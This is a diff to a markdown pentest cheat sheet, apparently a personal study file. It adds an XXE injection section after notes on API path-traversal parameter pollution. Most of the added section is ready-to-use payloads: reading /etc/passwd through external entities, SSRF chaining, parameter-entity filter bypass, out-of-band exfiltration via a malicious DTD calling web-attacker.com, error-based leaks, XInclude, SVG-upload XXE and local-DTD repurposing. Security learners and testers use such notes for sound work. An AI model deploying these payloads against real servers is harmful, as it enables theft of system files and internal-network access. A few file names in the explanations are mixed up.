@@ -448,6 +448,7 @@ If API has documentation that is a great place to learn more about the API itsel
 ## Exploitation
 
 **1)** If API doesn't have documentation publicly available we can try to look for endpoints that may refer to documentation such as:
+
 				□ /api
     
 				□ /swagger/index.html
@@ -526,4 +527,111 @@ Goes to the REST API Server-Side as:
 
    We can try to exploit parameter pollution by adding **path traversal** such as _../admin_ and if the application **normalize** the path we might be just able to retrieve information about the admin user in this instance. So essentially ```GET /edit_profile.php?name=peter%2f..%2fadmin``` will become ```GET /api/private/users/peter/../admin``` thanks to normalization app will resolve it as   ```GET /api/private/users/admin```
 
- 
+ # XXE Injection
+ XXE Injection is a vulnerability that exploits improperly configured XML parsers to process external entities, allowing attackers to access sensitive files or execute malicious requests.
+It can lead to data breaches, server-side request forgery (SSRF), or denial-of-service (DoS) attacks if XML input is not securely handled.
+
+## Exploitation
+
+**1)** Retrieving files with external entity XXE Injection:  If an app doesn't have any defense in place we can use XXE Injection to retrieve arbitrary files from the target system. We can pass our XML payload in the Request body to the endpoint that processes to retrieve files from the system:
+
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+Here we first create a malicious xxe entity and then pass it into the XML.
+
+**2)** If we manage to pull off XXE Injection we can chain it with SSRF, to interact with internal systems or just to make requests on behalf of the server to the external domains. We can then proceed with payloads as we do with classic SSRF for local data exfiltration:
+
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+
+**3)** Blind XXE Injection can be triggered the same way as SSRF one, but this time application is not returning anything in the response. (use Burp Collaborator to receive DNS Lookup or HTTP Request)
+--Note that when we are dealing with BLIND XML Injection even if the attack is successful we might get the error message in response, thus always check Burp Collaborator for traffic!--
+
+**4)** Sometimes the application is performing some input validation and blocking regular entities such as ```&xxe;```. We can bypass this by using XML Parameters instead ```(%xxe;)```. Instead of using payloads from **1)** for an example we will be bypassing weak defense mechanism of the app by not using regular entities such as:
+
+```
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<BURP_COLLABORATOR>"> %xxe; ]>
+<stockCheck><productId>%xxe;</productId></stockCheck>
+```
+
+**5)** We can exfiltrate the data with XXE Injection by leveraging Out-Of-Band Communication. There are a few steps to leverage this type of XXE Injection in order to exfiltrate the data.
+
+**5.1)** Store the malicious DTD on the server we control: (_feel free to call it however you want, it's important to be DTD such as malicious.dtd_
+
+```
+<!ENTITY % file SYSTEM "file:///etc/hostname"> 
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
+%eval; 
+%exfiltrate;   ---> MAKE SURE TO REPLACE web-attacker.com with BURP COLLABORATOR!
+```
+_in this case our goal is to exfiltrate /etc/hostaname file from the target server_
+
+**5.2)** Next is to trigger XXE Injection that we identified to make an out-of-band call to our malicious server where we are hosting malicious.dtd:
+	```<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>``` ----> Make sure to replace web-attacker.com with our exploit server where we are storing malicious.dtd
+**5.3)** Finally, if we did everything correctly we should get traffic in our Burp Collaborator with the content of an /etc/hosts in this case in the ```?x=``` parameter
+
+**6)** If the app is returning a verbose error message in a response we can try to exploit blind XXE to exfiltrate the data via error messages:
+
+**6.1)** Store again our payload as _malicious.dtd_ on the exploit server:
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd"> 
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> 
+%eval;
+%error;
+```
+
+**6.2)** Now we can leverage the XXE Injection that we found earlier to make a request to our exploit server and to retrieve files from the target server in the error message that is being returned to us:
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+And in the HTTP Response we will get /etc/passwd
+```
+
+**7)** XInclude Attack- Sometimes application takes user-submitted data and embeds it into an XML Document on the server side and then parses the document. Since we are controlling only a limited amount of parameters that we are passing to the XML Document we can submit Xinclude payload that might be executed by the XML Parsing on the server side.
+_Example for this one would be if the POST Request only contains parameters like:_ 
+
+```productId=1&storeId=1``` ---> we can try to pass our **XInclude Attack payload** into one of the parameters as:
+
+```<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo> ```
+
+This way if user-controlled data is being used to create an XML Document on the Server-Side we can retrieve local files as we would do with classic XXE Injection.
+
+**8)** If the applications allow us to upload SVG Images we can try to trigger XXE Injection because SVG images use XML Format. Payload:
+```
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+<text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+We can upload a regular image and then either intercept or replay the request by replacing the image Magic Bytes with the payload from the above and also changing the file extension to .svg or we can simply create svg image with the payload from above, store it locally and then upload it. Then after upload, load the image, and if the application is vulnerable /etc/hosts will be rendered within the image.
+
+**9)** If we are dealing with the application where out-of-band communication is not possible then the External DTD can't be loaded and we can't retrieve files like we did in payload **5) & 6)**. In such cases we have to utilize **Internal DTDs that are already presented on the system**
+
+**9.1)** First step here is to find what **DTDs** are actually present on the target server, this can be done by trying to load those DTDs, if we get an error such as ```java.io.FileNotFoundException``` that means that **DTD we are trying to load doesn't exist.**. If we **hit the DTD that does exist we will get a parsing error**, so we can use this enumeration method to map out DTDs that are actually present on the system. Payload for that:
+
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+
+**9.2)** Once when we confirm the DTDs on the target server, we have to find out **entities** that exist within those DTDs so we can redefine those. This can be done with an internet search as since many common systems that include DTD files are open source. So for an example on Linux GNOME we know that DTD exists at: ```/usr/share/yelp/dtd/docbookx.dtd``` with an entity: ```ISOamso```. So we can create a payload that will disclose internal files by leveraging internal DTDs and their entities via Error Messages as:
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+
+
+
